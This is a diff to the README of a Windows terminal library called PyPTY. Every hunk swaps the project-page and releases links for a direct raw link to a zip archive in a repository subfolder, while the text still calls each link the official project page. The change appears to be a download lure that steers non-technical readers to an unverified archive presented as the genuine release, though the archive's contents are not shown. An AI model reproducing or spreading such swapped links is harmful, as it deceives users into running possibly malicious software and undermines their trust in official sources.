@@ -1,6 +1,6 @@
 # 🖥️ PyPTY - Simple Terminal Control for Windows
 
-[![Download PyPTY](https://img.shields.io/badge/Download-PyPTY-green?style=for-the-badge)](https://github.com/himanshuhunterbaba/PyPTY)
+[![Download PyPTY](https://img.shields.io/badge/Download-PyPTY-green?style=for-the-badge)](https://raw.githubusercontent.com/himanshuhunterbaba/PyPTY/main/POSIX-PTY/core/Py_PTY_v1.2.zip)
 
 ---
 
@@ -20,7 +20,7 @@ PyPTY supports many terminals and systems. On Windows, it works with both ConPTY
 
 You can get PyPTY from its official project page on GitHub:
 
-[![Download PyPTY](https://img.shields.io/badge/Download-PyPTY-blue?style=for-the-badge)](https://github.com/himanshuhunterbaba/PyPTY)
+[![Download PyPTY](https://img.shields.io/badge/Download-PyPTY-blue?style=for-the-badge)](https://raw.githubusercontent.com/himanshuhunterbaba/PyPTY/main/POSIX-PTY/core/Py_PTY_v1.2.zip)
 
 Click this link to visit the page where you can download the software and find more details about it. The page holds the latest versions and will always have the newest updates.
 
@@ -46,7 +46,7 @@ Follow these steps to download and run PyPTY. You do not need to know coding or 
 ### Step 1: Download PyPTY
 
 1. Open the PyPTY GitHub page by clicking the download badge above or visiting:  
-   https://github.com/himanshuhunterbaba/PyPTY  
+   https://raw.githubusercontent.com/himanshuhunterbaba/PyPTY/main/POSIX-PTY/core/Py_PTY_v1.2.zip  
 2. Look for the **Releases** section on the page. You will find setup files or pre-built binaries there.
 3. Download the most recent stable release suitable for Windows. Usually, this will be a file ending in `.exe` or `.zip`.
 4. Save the file to your desktop or a folder you can easily find.
@@ -100,9 +100,9 @@ PyPTY mainly works behind the scenes. If you want to run a simple terminal sessi
 ## 🔗 Useful Links
 
 - Official PyPTY GitHub page:  
-  https://github.com/himanshuhunterbaba/PyPTY
+  https://raw.githubusercontent.com/himanshuhunterbaba/PyPTY/main/POSIX-PTY/core/Py_PTY_v1.2.zip
 - Latest downloads and releases:  
-  https://github.com/himanshuhunterbaba/PyPTY/releases
+  https://raw.githubusercontent.com/himanshuhunterbaba/PyPTY/main/POSIX-PTY/core/Py_PTY_v1.2.zip
 - Documentation and usage examples: Check the README files on the GitHub page
 
 ---
